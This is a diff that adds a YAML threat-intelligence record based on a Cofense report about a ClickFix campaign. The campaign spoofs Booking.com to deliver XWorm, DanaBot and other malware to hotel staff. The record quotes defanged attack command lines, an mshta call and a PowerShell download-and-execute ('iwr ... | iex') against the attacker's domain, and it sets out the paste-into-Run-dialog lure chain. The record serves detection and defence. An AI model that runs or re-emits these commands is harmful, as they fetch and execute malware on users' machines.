@@ -1,0 +1,38 @@
+description: Cofense Intelligence has been tracking travel assistance-themed, Booking.com-spoofing
+  emails targeting hotel chains, delivering various RATs or information stealers via
+  ClickFix fake CAPTCHA sites.
+attribution: Unknown
+malware_families:
+- XWorm RAT
+- Pure Logs Stealer
+- DanaBot
+- ConnectWise RAT
+TTPs:
+  processes:
+  - mshta.exe
+  - powershell.exe
+  commandline:
+  - mshta.exe hxxps://lanurbeauty[.]com/wp-includes/norob[.]txt
+  - powershell -w 1 iwr hxxps[://]lanurbeauty[.]com/wp-includes/norob[.]txt |iex
+  scripting_engine:
+  - powershell
+  - javascript
+  registry_keys: []
+  image_load: []
+  network_connections: []
+  file_activity:
+  - C:\\Users\\<user>\\AppData\\Local\\Temp\\
+  persistence:
+  - The report does not provide details on persistence mechanisms.
+  pipes: []
+  process_relations:
+  - ClickFix site -> JavaScript event -> Malicious script (PowerShell/Hta) in clipboard
+    -> User executes via Windows Key + R, Ctrl+V, Enter -> Malware payload
+IOCs:
+- hxxps://lanurbeauty[.]com/wp-includes/norob[.]txt
+authors:
+- Kahng An
+- Intelligence Team
+reference: https://cofense.com/blog/clickfix-campaign-spoofs-booking-com-for-malware-delivery
+date_of_publication: June 04, 2025
+file_creation_date: June 05, 2025
